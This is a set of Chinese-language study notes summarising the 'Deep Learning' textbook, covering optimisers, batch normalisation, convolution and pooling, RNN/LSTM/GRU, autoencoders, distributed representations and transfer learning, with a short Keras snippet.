8.3 基本算法 （批）随机梯度下降（SGD）与学习率 SGD 及相关的小批量亦或更广义的基于梯度优化的在线学习算法，一个重要的性质是每一步更新的计算时间不依赖训练样本数目的多寡。因为它每个 step 的样本数是固定的。 所以即使训练样本数目非常大时，它们也能收敛。对于足够大的数据集， SGD 可能会在处理整个训练集之前就收敛到最终测试集误差的某个固定容差范围内。 SGD 与学习率 SGD 算法中的一个关键参数是学习率。在实践中，有必要随着时间的推移逐渐降低学习率。 实践中，一般会线性衰减学习率直到第 τ 次迭代： 其中 α=k/τ。在 τ 步迭代之后，一般使 ϵ 保持常数。 使用线性策略时，需要选择的参数有 ϵ_0, ϵ_τ 和 τ 通常 τ 被设为需要反复遍历训练集几百次的迭代次数（？） 通常 ϵ_τ 应设为大约 ϵ_0 的 1% 如何设置 ϵ_0？ 若 ϵ_0 太大，学习曲线将会剧烈振荡，代价函数值通常会明显增加。温和的振荡是良好的，容易在训练随机代价函数（例如使用 Dropout 的代价函数）时出现。如果学习率太小，那么学习过程会很缓慢。如果初始学习率太低，那么学习可能会卡在一个相当高的代价值。通常，就总训练时间和最终代价值而言，最优初始学习率会高于大约迭代 100 次左右后达到最佳效果的学习率。因此，通常最好是检测最早的几轮迭代，选择一个比在效果上表现最佳的学习率更大的学习率，但又不能太大导致严重的震荡。 学习率可通过试验和误差来选取，通常最好的选择方法是监测目标函数值随时间变化的学习曲线——与其说是科学，这更像是一门艺术。 29. 自适应学习率算法: AdaGrad，RMSProp，Adam 等*** 带动量的 SGD 从形式上看， 动量算法引入了变量 v 充当速度角色——它代表参数在参数空间移动的方向和速率。速度被设为负梯度的指数衰减平均。 之前，步长只是梯度范数乘以学习率。现在，步长取决于梯度序列的大小和排列。当许多连续的梯度指向相同的方向时，步长最大。如果动量算法总是观测到梯度 g，那么它会在方向 −g 上不停加速，直到达到最终速度，其中步长大小为 在实践中，α 的一般取值为 0.5, 0.9 和 0.99，分别对应最大速度 2倍，10倍和100倍于普通的 SGD 算法。和学习率一样， α 也应该随着时间不断调整（变大），但没有收缩 ϵ 重要。 为什么要加入动量？ 加入的动量主要目的是解决两个问题： Hessian 矩阵的病态条件和随机梯度的方差。简单来说，就是为了加速学习。 虽然动量的加入有助于缓解这些问题，但其代价是引入了另一个超参数。 29. 自适应学习率算法: AdaGrad，RMSProp，Adam 等*** 带有动量的 SGD（左/上） 和不带动量的 SGD（右/下）： 《深度学习》 4.3.1 梯度之上： Jacobian 和 Hessian 矩阵 此图说明动量如何克服病态的问题：等高线描绘了一个二次损失函数（具有病态条件的 Hessian 矩阵）。一个病态条件的二次目标函数看起来像一个长而窄的山谷或具有陡峭边的峡谷。带动量的 SGD 能比较正确地纵向穿过峡谷；而普通的梯度步骤则会浪费时间在峡谷的窄轴上来回移动，因为梯度下降无法利用包含在 Hessian 矩阵中的曲率信息。 Nesterov 动量 受 Nesterov 加速梯度算法 (Nesterov, 1983, 2004) 启发， Sutskever et al. (2013) 提出了动量算法的一个变种。其更新规则如下： 其中参数 α 和 ϵ 发挥了和标准动量方法中类似的作用。Nesterov 动量和标准动量之间的区别体现在梯度计算上。下面是完整的 Nesterov 动量算法： Nesterov 动量中，梯度计算在施加当前速度之后。因此，Nesterov 动量可以解释为往标准动量方法中添加了一个校正因子。 在凸批量梯度的情况下， Nesterov 动量将额外误差收敛率从 O(1/k) 改进到 O(1/k^2)。可惜，在随机梯度的情况下， Nesterov 动量没有改进收敛率。 自适应学习率算法：AdaGrad、RMSProp、Adam 等*** 《深度学习》 8.5 自适应学习率算法 Delta-bar-delta (Jacobs, 1988) 是一个早期的自适应学习率算法。该方法基于一个很简单的想法，如果损失对于某个给定模型参数的偏导保持相同的符号，那么学习率应该增加。如果对于该参数的偏导变化了符号，那么学习率应减小。当然，这种方法只能应用于全批量优化中（？）。 最近，提出了一些增量（或者基于小批量）的算法来自适应模型参数的学习率。 AdaGrad AdaGrad 会独立地适应所有模型参数的学习率。具体来说，就是缩放每个参数反比于其所有梯度历史平方值总和的平方根 (Duchi et al., 2011)。效果上具有损失最大偏导的参数相应地有一个快速下降的学习率，而具有小偏导的参数在学习率上有相对较小的下降。 不过，对于训练深度神经网络模型而言，从训练开始时就积累梯度平方会导致有效学习率过早和过量的减小。AdaGrad 在某些深度学习模型上效果不错，但不是全部。 RMSProp RMSProp 修改自 AdaGrad。AdaGrad 旨在应用于凸问题时快速收敛，而 RMSProp 在非凸设定下效果更好，改变梯度积累为指数加权的移动平均。 RMSProp 使用指数衰减平均以丢弃遥远过去的历史，使其能够在找到凸碗状结构后快速收敛，它就像一个初始化于该碗状结构的 AdaGrad 算法实例。 相比于 AdaGrad，使用移动平均引入了一个新的超参数 ρ，用来控制移动平均的长度范围。 经验上， RMSProp 已被证明是一种有效且实用的深度神经网络优化算法。目前它是深度学习从业者经常采用的优化方法之一。 结合 Nesterov 动量的 RMSProp Adam Adam (Kingma and Ba, 2014) 是另一种学习率自适应的优化算法。 首先，在 Adam 中，动量直接并入了梯度一阶矩（指数加权）的估计。将动量加入 RMSProp 最直观的方法是将动量应用于缩放后的梯度。但是结合缩放的动量使用没有明确的理论动机。其次， Adam 包括偏置修正，修正从原点初始化的一阶矩（动量项）和（非中心的）二阶矩的估计。RMSProp 也采用了（非中心的）二阶矩估计，然而缺失了修正因子。因此，不像 Adam， RMSProp 二阶矩估计可能在训练初期有很高的偏置。Adam 通常被认为对超参数的选择相当鲁棒，尽管学习率有时需要从建议的默认修改。 如何选择自适应学习率算法？ 目前在这一点上没有明确的共识。选择哪一个算法似乎主要取决于使用者对算法的熟悉程度（以便调节超参数）。 如果不知道选哪个，就用 AdamSGD 吧。 基于二阶梯度的优化方法：牛顿法、共轭梯度、BFGS 等的做法* 《深度学习》 8.6 二阶近似方法：8.6.1 牛顿法，8.6.2 共轭梯度，8.6.3 BFGS 推导很难实际上也很少用，如果你不是数学系的，可以跳过这部分。 批标准化（Batch Normalization）的意义** 《深度学习》 8.7.1 批标准化 批标准化（Batch Normalization, BN, Ioffe and Szegedy, 2015）是为了克服神经网络层数加深导致难以训练而出现的一个算法。 说到底，BN 还是为了解决梯度消失/梯度爆炸问题，特别是梯度消失。 BN 算法： BN 算法需要学习两个参数 γ 和 β. Ioffe and Szegedy, 2015, Batch Normalization: Accelerating Deep Network Training by Reducing Internal Covariate Shift 批标准化为什么有用？ 深度学习（二十九）Batch Normalization 学习笔记 - CSDN博客 深度学习中 Batch Normalization为什么效果好？ - 知乎 神经网络中的卷积，以及卷积的动机：稀疏连接、参数共享、等变表示（平移不变性）*** 《深度学习》 9.2 动机 注意：本书所谈的卷积，是包括卷积层、激活层和池化层的统称 神经网络中的卷积： 当我们在神经网络中提到卷积时，通常是指由多个并行卷积组成的运算。一般而言，每个核只用于提取一种类型的特征，尽管它作用在多个空间位置上。而我们通常希望网络的每一层能够在多个位置提取多种类型的特征。 《深度学习》 9.5 基本卷积函数的变体 卷积的一些基本概念：通道（channel）、卷积核（kernel、filter）、步幅（stride，下采样）、填充（padding） 33. 卷积中零填充的影响，基本卷积的变体 为什么使用卷积？（卷积的动机） 卷积运算通过三个重要的思想来帮助改进机器学习系统：稀疏交互（sparseinteractions）、参数共享（parameter sharing）、等变表示（equivariant representations）。 稀疏连接（sparse connectivity） 稀疏连接，也称稀疏交互、稀疏权重。 传统的神经网络中每一个输出单元会与每一个输入单元都产生交互。卷积网络改进了这一点，使具有稀疏交互的特征。CNN 通过使核（kernel、filter）的大小远小于输入的大小来达到的这个目的。 举个例子，当处理一张图像时，输入的图像可能包含成千上万个像素点，但是我们可以通过只占用几十到上百个像素点的核来检测一些小的、有意义的特征，例如图像的边缘。 稀疏交互的好处： 提高了模型的统计效率：原本一幅图像只能提供少量特征，现在每一块像素区域都可以提供一部分特征 减少了模型的存储需求和计算量，因为参数更少 如果有 m 个输入和 n 个输出，那么矩阵乘法需要 m × n 个参数并且相应算法的时间复杂度为 O(m × n)；如果限制每一个输出拥有的连接数为 k，那么稀疏的连接方法只需要 k × n 个参数以及 O(k × n) 的运行时间。而在实际应用中，k 要比 m 小几个数量级。 虽然看似减少了隐藏单元之间的交互，但实际上处在深层的单元可以间接地连接到全部或者大部分输入。 参数共享（parameter sharing） 参数共享是指在一个模型的多个函数中使用相同的参数。作为参数共享的同义词，我们可以说 一个网络含有 绑定的权重（tied weights） 在传统的神经网络中，当计算一层的输出时，权重矩阵的每一个元素只使用一次，当它乘以输入的一个元素后就再也不会用到了。卷积运算中的参数共享保证了我们只需要学习一个参数集合，而不是对于每一位置都需要学习一个单独的参数集合。 考虑一个具体的例子——边缘检测——来体会稀疏连接+参数共享带来的效率提升： 两个图像的高度均为 280 个像素。输入图像的宽度为 320 个像素，而输出图像的宽度为 319 个像素（padding=‘VALID’）。对于边缘检测任务而言，只需要一个包含两个元素的卷积核就能完成；而为了用矩阵乘法描述相同的变换，需要一个包含 320 × 280 × 319 × 280 ≈ 80亿个元素的矩阵（40亿倍）。 同样，使用卷积只需要 319 × 280 × 3 = 267,960 次浮点运算（每个输出像素需要两次乘法和一次加法）；而直接运行矩阵乘法的算法将执行超过 160 亿次浮点运算（60000倍） 平移等变|不变性（translation invariant） （局部）平移不变性是一个很有用的性质，尤其是当我们关心某个特征是否出现而不关心它出现的具体位置时。 参数共享（和池化）使卷积神经网络具有一定的平移不变性。这就意味着即使图像经历了一个小的平移，依然会产生相同的特征。例如，分类一个 MNIST 数据集的数字，对它进行任意方向的平移（不是旋转），无论最终的位置在哪里，都能正确分类。 池化操作也能够帮助加强网络的平移不变性 &gt; 35. 池化、池化（Pooling）的作用*** 什么是等变性？ 如果一个函数满足输入改变，输出也以同样的方式改变这一性质，我们就说它是等变 (equivariant) 的。 对于卷积来说，如果令 g 是输入的任意平移函数，那么卷积函数对于 g 具有等变性。 当处理时间序列数据时，这意味着通过卷积可以得到一个由输入中出现不同特征的时刻所组成的时间轴。如果我们把输入中的一个事件向后延时，在输出中仍然会有完全相同的表示，只是时间延后了。 图像与之类似，卷积产生了一个 2 维映射来表明某些特征在输入中出现的位置。如果我们移动输入中的对象，它的表示也会在输出中移动同样的量。 卷积对其他的一些变换并不是天然等变的，例如对于图像的放缩或者旋转变换，需要其他的一些机制来处理这些变换。 池化的不变性 - Ufldl 卷积中不同零填充的影响** 《深度学习》 9.5 基本卷积函数的变体 在任何卷积网络的实现中都有一个重要性质，那就是能够隐含地对输入用零进行填充使得它加宽。如果没有这个性质，会极大得限制网络的表示能力。 三种零填充设定，其中 m 和 k 分别为图像的宽度和卷积核的宽度（高度类似）： 有效（valid）卷积——不使用零填充，卷积核只允许访问那些图像中能够完全包含整个核的位置，输出的宽度为 m − k + 1. 在这种情况下，输出的所有像素都是输入中相同数量像素的函数，这使得输出像素的表示更加规范。 然而，输出的大小在每一层都会缩减，这限制了网络中能够包含的卷积层的层数。（一般情况下，影响不大，除非是上百层的网络） 相同（same）卷积——只进行足够的零填充来保持输出和输入具有相同的大小，即输出的宽度为 m. 在这种情况下，只要硬件支持，网络就能包含任意多的卷积层。 然而，输入像素中靠近边界的部分相比于中间部分对于输出像素的影响更小。这可能会导致边界像素存在一定程度的欠表示。 全（full）卷积——进行足够多的零填充使得每个像素都能被访问 k 次（非全卷积只有中间的像素能被访问 k 次），最终输出图像的宽度为 m + k − 1. 因为 same 卷积可能导致边界像素欠表示，从而出现了 Full 卷积； 但是在这种情况下，输出像素中靠近边界的部分相比于中间部分是更少像素的函数。这将导致学得的卷积核不能再所有所有位置表现一致。 事实上，很少使用 Full 卷积 注意：如果以“全卷积”作为关键词搜索，返回的是一个称为 FCN（Fully Convolutional Networks）的卷积结构，而不是这里描述的填充方式。 通常零填充的最优数量（对于测试集的分类正确率）处于 “有效卷积”和 “相同卷积” 之间。 基本卷积的变体：反卷积、空洞卷积*** 原书中也描述一些基本卷积的变体：局部卷积、平铺卷积； 从上到下一次为局部卷积、平铺卷积和标准卷积； 《深度学习》 9.5 基本卷积函数的变体 不过这跟我想的“变体”不太一样（百度都搜不到这两种卷积），下面介绍的是一些我认识中比较流行的卷积变体： 转置卷积|反卷积（Transposed convolution） No padding, no strides, transposed 如何理解深度学习中的deconvolution networks？ - 知乎 空洞卷积|扩张卷积（Dilated convolution） No padding, no stride, dilation 如何理解空洞卷积（dilated convolution）？ - 知乎 卷积、转置卷积、空洞卷积动图演示：vdumoulin/conv_arithmetic: A technical report on convolution arithmetic in the context of deep learning 池化、池化（Pooling）的作用*** 《深度学习》 9.3 池化 一次典型的卷积包含三层：第一层并行地计算多个卷积产生一组线性激活响应；第二层中每一个线性激活响应将会通过一个非线性的激活函数；第三层使用池化函数（pooling function）来进一步调整这一层的输出。 1234567891011 # Kerasfrom keras.layers import Input, Conv2D, Activation, MaxPooling2Dnet = Input([in_w, in_h, input_dim])net = Conv2D(output_dim, kernel_size=(3, 3))(net)net = Activation(&apos;relu&apos;)(net)net = MaxPooling2D(pool_size=(2, 2))(net)&quot;&quot;&quot;卷积层中，一般 strides=1, padding=&apos;valid&apos;池化层中，一般 strides=pool_size, padding=&apos;valid&apos;&quot;&quot;&quot; 池化函数使用某一位置的相邻输出的总体统计特征来代替网络在该位置的输出。 常见的池化函数： *最大池化（Max pooling） *平均值池化（Mean pooling） L2 范数 基于中心像素距离的加权平均 池化操作有助于卷积网络的平移不变性 32.3. 平移等变/不变性（translation invariant） 使用池化可以看作是增加了一个无限强的先验：这一层学得的函数必须具有对少量平移的不变性。当这个假设成立时，池化可以极大地提高网络的统计效率。 （最大）池化对平移是天然不变的，但池化也能用于学习其他不变性： 这三个过滤器都旨在检测手写的数字 5。每个过滤器尝试匹配稍微不同方向的 5。当输入中出现 5 时，无论哪个探测单元被激活，最大池化单元都将产生较大的响应。 这种多通道方法只在学习其他变换时是必要的。这个原则在 maxout 网络 (Goodfellow et al., 2013b) 和其他卷积网络中更有影响。 池化综合了区域内的 k 个像素的统计特征而不是单个像素，这种方法提高了网络的计算效率，因为下一层少了约 k 倍的输入。 在很多任务中，池化还有助于对于处理不同大小的输入：例如我们想对不同大小的图像进行分类时，分类层的输入必须是固定的大小，而这通常通过调整池化区域的偏置大小来实现。 其他参考： 一些理论工作对于在不同情况下应当使用哪种池化函数给出了一些指导 (Boureau et al., 2010) 将特征一起动态地池化：对于感兴趣特征的位置运行聚类算法 (Boureau et al., 2011)、先学习一个单独的池化结构，再应用到全部的图像中 (Jia et al., 2012) 《深度学习》 20.6 卷积玻尔兹曼机、20.10.6 卷积生成网络 卷积与池化的意义、影响（作为一种无限强的先验）** 《深度学习》 9.4 卷积与池化作为一种无限强的先验 一个无限强的先验需要对一些参数的概率置零并且完全禁止对这些参数赋值，无论数据对于这些参数的值给出了多大的支持。 如果把卷积网络类比成全连接网络，那么对于这个全连接网络的权重有一个无限强的先验：隐藏单元的权重必须和它邻居的权重相同，但可以在空间上移动；同时要求除了那些处在“感受野”内的权重以外，其余的权重都为零。 类似的，使用池化也是一个无限强的先验：每一个单元都具有对少量平移的不变性。 卷积与池化作为一种无限强先验的影响： 卷积和池化可能导致欠拟合 与任何其他先验类似，卷积和池化只有当先验的假设合理且正确时才有用。 如果一项任务涉及到要对输入中相隔较远的信息进行合并时，那么卷积所利用的先验可能就不正确了。 如果一项任务依赖于保存精确的空间信息，那么在所有的特征上使用池化将会增大训练误差。 因此，一些卷积网络结构 (Szegedy et al., 2014a) 为了既获得具有较高不变性的特征又获得当平移不变性不合理时不会导致欠拟合的特征，被设计成在一些通道上使用池化而在另一些通道上不使用。 当我们比较卷积模型的统计学习表现时，只能以基准中的其他卷积模型作为比较的对象 《深度学习》 5.6 贝叶斯统计（先验概率分布） RNN 的几种基本设计模式 《深度学习》 10.2 循环神经网络 循环神经网络中一些重要的设计模式包括以下几种： （*）每个时间步都有输出，并且隐藏单元之间有循环连接的循环网络 将 x 值的输入序列映射到输出值 o 的对应序列 损失 L 衡量每个 o 与相应的训练目标 y 的距离 损失 L 内部计算 y^ = softmax(o)，并将其与目标 y 比较 输入 x 到隐藏 h 的连接由权重矩阵 U 参数化 隐藏 h(t-1) 到隐藏 h(t) 的循环连接由权重矩阵 W 参数化 隐藏到输出的连接由权重矩阵 V 参数化 每个时间步都产生一个输出，只有当前时刻的输出到下个时刻的隐藏单元之间有循环连接的循环网络 此类 RNN 的唯一循环是从输出 o 到隐藏层 h 的反馈连接 表示能力弱于 RNN_1，单更容易训练 隐藏单元之间存在循环连接，但读取整个序列后产生单个输出的循环网络 这样的网络可以用于概括序列并产生用于进一步处理的固定大小的表示 一般所说的 RNN（循环神经网络）指的是第一种设计模式 这些循环网络都将一个输入序列映射到相同长度的输出序列 RNN 更新方程（前向传播公式），包括 LSTM、GRU 等*** 《深度学习》 10 序列建模：循环和递归网络 RNN, LSTM, GRU 公式总结 - CSDN博客 基本 RNN Recurrent neural network - Wikipedia 根据隐层 h(t) 接受的是上时刻的隐层 h(t−1) 还是上时刻的输出 y(t−1)，分为两种 RNN： Elman RNN [](http://www.codecogs.com/eqnedit.php?latex=\\begin{aligned}&amp;space;h{(t)}&amp;=\\tanh\\left(&amp;space;W_hx{(t)}+U_hh{(t-1)}&amp;plus;b_h&amp;space;\\right)\\&amp;space;y{(t)}&amp;={\\rm&amp;space;softmax}\\left(&amp;space;W_yh^{(t)}+b_y&amp;space;\\right)\\&amp;space;\\end{aligned}) Jordan RNN [](http://www.codecogs.com/eqnedit.php?latex={\\displaystyle&amp;space;{\\begin{aligned}&amp;space;h{(t)}&amp;=\\tanh\\left(&amp;space;W_hx{(t)}+U_hy{(t-1)}&amp;plus;b_h&amp;space;\\right)\\&amp;space;y{(t)}&amp;={\\rm&amp;space;softmax}\\left(&amp;space;W_yh^{(t)}+b_y&amp;space;\\right)&amp;space;\\end{aligned}}}) 《深度学习》 默认的 RNN 是 Elman RNN &gt; 37. RNN（循环神经网络） 的几种基本设计模式** 门限 RNN（LSTM、GRU）与基本 RNN 的主要区别在于 Cell 部分 LSTM Long short-term memory - Wikipedia 其中 f 为遗忘门（forget），i 为输入门（input），o 为输出门（output）。 每个门的输入都是 x 和 h，但是参数都是独立的（参数数量是基本 RNN 的 4 倍） c 表示 cell state（如果用过 tensorflow 中的 RNN，会比较熟悉） 如果遗忘门 f 取 0 的话，那么上一时刻的状态就会全部被清空，只关注此时刻的输入 输入门 i 决定是否接收此时刻的输入 输出门 o 决定是否输出 cell state 类似基本 RNN，LSTM 也有另一个版本，将公式中所有 h(t-1) 替换为 c(t-1)，但不常见 GRU Gated recurrent unit - Wikipedia [](http://www.codecogs.com/eqnedit.php?latex={\\displaystyle&amp;space;{\\begin{aligned}&amp;space;z_{t}&amp;=\\sigma(W_{z}x_{t}+U_{z}h_{t-1}+b_{z})\\&amp;space;r_{t}&amp;=\\sigma(W_{r}x_{t}+U_{r}h_{t-1}+b_{r})\\&amp;space;\\tilde{h}t&amp;=\\tanh(W{h}x_{t}+U_{h}(r_{t}\\circ&amp;space;h_{t-1})+b_{h})\\&amp;space;h_{t}&amp;=(1-z_{t})\\circ&amp;space;h_{t-1}+z_{t}\\circ&amp;space;\\tilde{h}_t&amp;space;\\end{aligned}}}) 其中 z 为更新门（update），r 为重置门（reset） GRU 可以看作是将 LSTM 中的遗忘门和输入门合二为一了 BPTT（back-propagation through time，通过时间反向传播）** 《深度学习》 10.2.2 计算循环神经网络的梯度 自编码器在深度学习中的意义* 自编码器的意义： 传统自编码器被用于降维或特征学习 近年来，自编码器与潜变量模型理论的联系将自编码器带到了生成式建模的前沿 几乎任何带有潜变量并配有一个推断过程（计算给定输入的潜在表示）的生成模型，都可以看作是自编码器的一种特殊形式。 《深度学习》 20 深度生成模型，20.10.3 变分自编码器，20.12 生成随机网络 自编码器的一般结构 自编码器有两个组件：编码器 f（将 x 映射到 h）和解码器 g（将 h 映射到 r） 一个简单的自编码器试图学习 g(f(x)) = x；换言之，自编码器尝试将输入复制到输出 单纯将输入复制到输出没什么用，相反，训练自编码器的目标是获得有用的特征 h。 自编码器的学习过程就是最小化一个损失函数： [](http://www.codecogs.com/eqnedit.php?latex=L(\\boldsymbol{x},g(f(\\boldsymbol{x})))) 自编码器一些常见的变形与应用：正则自编码器、稀疏自编码器、去噪自编码器* 40. 自编码器在深度学习中的意义 《深度学习》 14.2 正则自编码器 欠完备自编码器 从自编码器获得有用特征的一种方法是限制 h 的维度比 x 小，这种编码维度小于输入维度的自编码器称为欠完备（undercomplete）自编码器； 相反，如果 h 的维度大于 x，此时称为过完备自编码器。 学习欠完备的表示将强制自编码器捕捉训练数据中最显著的特征 当解码器是线性的且 L 是均方误差，欠完备的自编码器会学习出与 PCA 相同的生成子空间 而拥有非线性编码器函数 f 和非线性解码器函数 g 的自编码器能够学习出更强大的 PCA 非线性推广 但如果编码器和解码器被赋予过大的容量，自编码器会执行复制任务而捕捉不到任何有关数据分布的有用信息。 过完备自编码器就可以看作是被赋予过大容量的情况 正则自编码器 通过加入正则项到损失函数可以限制模型的容量，同时鼓励模型学习除了复制外的其他特性。 这些特性包括稀疏表示、表示的小导数、以及对噪声或输入缺失的鲁棒性。 即使模型的容量依然大到足以学习一个无意义的恒等函数，正则自编码器仍然能够从数据中学到一些关于数据分布的信息。 稀疏自编码器 稀疏自编码器一般用来学习特征 稀疏自编码器简单地在训练时结合编码层的稀疏惩罚 Ω(h) 和重构误差： [](http://www.codecogs.com/eqnedit.php?latex=L(\\boldsymbol{x},g(f(\\boldsymbol{x})))+\\Omega(\\boldsymbol{h})&amp;space;=&amp;space;L(\\boldsymbol{x},g(f(\\boldsymbol{x})))+\\lambda\\sum_i\\left|h_i\\right|) 稀疏惩罚不算是一个正则项。这仅仅影响模型关于潜变量的分布。这个观点提供了训练自编码器的另一个动机：这是近似训练生成模型的一种途径。这也给出了为什么自编码器学到的特征是有用的另一个解释：它们描述的潜变量可以解释输入。 《深度学习》 14.2.1 稀疏自编码器 去噪自编码器（DAE） 去噪自编码器试图学习更具鲁棒性的特征 与传统自编码器不同，去噪自编码器（denoising autoencoder, DAE）最小化： [](http://www.codecogs.com/eqnedit.php?latex=L(\\boldsymbol{x},g(f(\\boldsymbol{\\tilde{x}})))) 这里的 x~ 是被某种噪声损坏的 x 的副本，去噪自编码器需要预测原始未被损坏数据 破坏的过程一般是以某种概率分布（通常是二项分布）将一些值置 0. 《深度学习》 14.2.2 去噪自编码器，14.5 去噪自编码器 为什么DAE有用？ 对比使用非破损数据进行训练，破损数据训练出来的权重噪声比较小——在破坏数据的过程中去除了真正的噪声 破损数据一定程度上减轻了训练数据与测试数据的代沟——使训练数据更接近测试数据 降噪自动编码器（Denoising Autoencoder) - Physcal - 博客园 感觉这两个理由很牵强，但是从数据分布的角度讲太难了 半监督的思想以及在深度学习中的应用* 《深度学习》 15.3 半监督解释因果关系 分布式表示的概念、应用，与符号表示（one-hot 表示）的区别*** 《深度学习》 15.4 分布式表示 什么是分布式表示？ 所谓分布式表示就是用不同的特征，通过组合来表示不同的概念 （左）是 one-hot 表示（一种稀疏表示），（右）为分布式表示 神经网络如何学习分布式表示 - 百家号 分布式表示为什么强大？——分布式表示与符号表示 分布式表示之所以强大，是因为它能用具有 d 个值的 n 个线性阀值特征去描述 d^n 个不同的概念——换言之，在输入维度是 d 的一般情况下，具有 n 个特征的分布式表示可以给 O(n^d) 个不同区域分配唯一的编码 线性阀值特征：本身是一个连续值，通过划分阈值空间来获得对应的离散特征 符号表示 如果我们没有对数据做任何假设，并且每个区域使用唯一的符号来表示，每个符号使用单独的参数去识别空间中的对应区域，那么指定 O(n^d) 个区域需要 O(n^d) 个样本/参数。 举个例子：作为纯符号，“猫”和“狗”之间的距离和任意其他两种符号的距离是一样。 然而，如果将它们与有意义的分布式表示相关联，那么关于猫的很多特点可以推广到狗，反之亦然——比如，某个分布式表示可能会包含诸如“具有皮毛”或“腿的数目”这类在猫和的嵌入/向量上具有相同值的项 分布式表示与符号表示（最近邻）： 两者都在学习如何将输入空间分割成多个区域 在输入维度相同的情况下，分布式表示能够比非分布式表示多分配指数级的区域——这一特性可用于解决维度灾难问题 44. 如何理解维数灾难？ 非线性特征： 上面假设了线性阀值特征，然而更一般的，分布式表示的优势还体现在其中的每个特征可以用非线性算法——神经网络——来提取。简单来说，表示能力又提升了一个级别。 一般来说，无论我们使用什么算法，需要学习的空间区域数量是固定的；但是使用分布式表示有效的减少了参数的数量——从 O(n^d) 到 O(nd)——这意味着我们需要拟合参数更少，因此只需要更少的训练样本就能获得良好的泛化。 一些非分布式表示算法： 聚类算法，比如 k-means 算法 k-最近邻算法 决策树 支持向量机 基于 n-gram 的语言模型 什么时候应该使用分布式表示能带来统计优势？ 当一个明显复杂的结构可以 用较少参数紧致地表示时，使用分布式表示就会具有统计上的优势（避免维数灾难）。 44. 如何理解维数灾难？ 一些传统的非分布式学习算法仅仅在平滑先验的情况下能够泛化。 如何理解维数灾难？*** 《深度学习》 5.11.1 维数灾难 概括来说，就是当数据维数很高时，会导致学习变得困难。 这里的“困难”体现在两方面： 当数据较多时，会使训练的周期变得更长 当数据较少时，对新数据的泛化能力会更弱，甚至失去泛化能力 这两点对于任何机器学习算法都是成立的；但在维数灾难的背景下，会加剧这两个影响 对于第二点，书中使用了另一种描述：“由维数灾难带来的一个问题是统计挑战，所谓统计挑战指的是 x 的可能配置数目远大于训练样本的数目”。 为了充分理解这个问题，我们假设输入空间如图所示被分成单元格。 当数据的维度增大时（从左向右），我们感兴趣的配置数目会随指数级增长。 当空间是低维时，我们可以用由少量单元格去描述这个空间。泛化到新数据点时，通过检测和单元格中的训练样本的相似度，我们可以判断如何处理新数据点。 当空间的维数很大时，很可能发生大量单元格中没有训练样本的情况。此时，基于“平滑先验”的简单算法将无力处理这些新的数据。 7. 局部不变性（平滑先验）及其在基于梯度的学习上的局限性* 更一般的，O(nd) 个参数（d 个特征，每个特征有 n 种表示）能够明确表示输入空间中 O(n^d) 个不同区域。如果我们没有对数据做任何假设，并且每个区域使用唯一的符号来表示，每个符号使用单独的参数去识别空间中的对应区域，那么指定 O(n^d) 个区域将需要 O(n^d) 个样本。 《深度学习》 15.4 分布式表示 如何解决维数灾难？ 43.3. 什么时候应该使用分布式表示能带来统计优势？ 迁移学习相关概念：多任务学习、一次学习、零次学习、多模态学习** 《深度学习》 15.2 迁移学习和领域自适应 什么是迁移学习？ 迁移学习和领域自适应指的是利用一个任务（例如，分布 P1）中已经学到的内容去改善另一个任务（比如分布 P2）中的泛化情况。 例如，我们可能在第一个任务中学习了一组视觉类别，比如猫和狗，然后在第二种情景中学习一组不同的视觉类别，比如蚂蚁和黄蜂。 除了共享输出语义（上面这个例子），有时也会共享输出语义 例如，语音识别系统需要在输出层产生有效的句子，但是输入附近的较低层可能需要识别相同音素或子音素发音的不同版本（这取决于说话人） 迁移学习与多任务学习 因为目前迁移学习更流行，因此不少博客简介上，会将多任务学习归属于迁移学习的子类或者迁移学习的相关领域。 迁移学习与多任务学习的一些结构： （左）&gt; 《深度学习》 15.2 迁移学习和领域自适应；（右）&gt; 《深度学习》 7.7 多任务学习 这两种都可能是迁移学习或者多任务学习的结构。迁移学习的输入在每个任务上具有不同的意义（甚至不同的维度），但是输出在所有的任务上具有相同的语义；多任务学习则相反 迁移学习与领域自适应 相比于迁移学习和多任务学习，领域自适应的提法比较少，也更简单一些，其在每个情景之间任务（和最优的输入到输出的映射）都是相同的，但是输入分布稍有不同。 例如，考虑情感分析的任务：网上的评论有许多类别。在书、视频和音乐等媒体内容上训练的顾客评论情感预测器，被用于分析诸如电视机或智能电话的消费电子产品的评论时，领域自适应情景可能会出现。可以想象，存在一个潜在的函数可以判断任何语句是正面的、中性的还是负面的，但是词汇和风格可能会因领域而有差异 one-shot learning 和 zero-shot learning 迁移学习的两种极端形式是一次学习（one-shot learning）和零次学习（zero-shot learning） 只有少量标注样本的迁移任务被称为 one-shot learning；没有标注样本的迁移任务被称为 zero-shot learning. one-shot learning one-shot learning 稍微简单一点：在大数据上学习 general knowledge，然后在特定任务的小数据上有技巧的 fine tuning。 zero-shot learning 相比 one-shot，zero-shot learning 要更复杂。 先来看一个 zero-shot 的例子：假设学习器已经学会了关于动物、腿和耳朵的概念。如果已知猫有四条腿和尖尖的耳朵，那么学习器可以在没有见过猫的情况下猜测该图像中的动物是猫。 (TODO) 多模态学习（multi-modal learning） 与 zero-shot learning 相同的原理可以解释如何能执行多模态学习（multimodal learning） 《深度学习》 15.2 迁移学习和领域自适应 图 15.3 图模型|结构化概率模型相关概念* 《深度学习》 16 深度学习中的结构化概率模型 答案不完整，更多相关概念请阅读本章 有向图模型 有向图模型（directed graphical model）是一种结构化概率模型，也被称为信念网络（belief network）或者贝叶斯网络（Bayesian network） 描述接力赛例子的有向图模型 Alice 在 Bob 之前开始，所以 Alice 的完成时间 t0 影响了 Bob 的完成时间 t1。 Carol 只会在 Bob 完成之后才开始，所以 Bob 的完成时间 t1 直接影响了 Carol 的完成时间 t2。 正式地说，变量 x 的有向概率模型是通过有向无环图 G（每个结点都是模型中的随机变量）和一系列局部条件概率分布（local conditional probability distribution）来定义的，x 的概率分布可以表示为： 其中 大P 表示结点 xi 的所有父结点 上述接力赛例子的概率分布可表示为： 无向图模型 无向图模型（undirected graphical Model），也被称为马尔可夫随机场（Markov random field, MRF）或者是马尔可夫网络（Markov network） 当相互的作用并没有本质性的指向，或者是明确的双向相互作用时，使用无向模型更加合适。 图模型的优点 减少参数的规模 通常意义上说，对每个变量都能取 k 个值的 n 个变量建模，基于查表的方法需要的复杂度是 O(k^n)，如果 m 代表图模型的单个条件概率分布中最大的变量数目，那么对这个有向模型建表的复杂度大致为 O(k^m)。只要我们在设计模型时使其满足 m ≪ n，那么复杂度就会被大大地减小；换一句话说，只要图中的每个变量都只有少量的父结点，那么这个分布就可以用较少的参数来表示。 统计的高效性 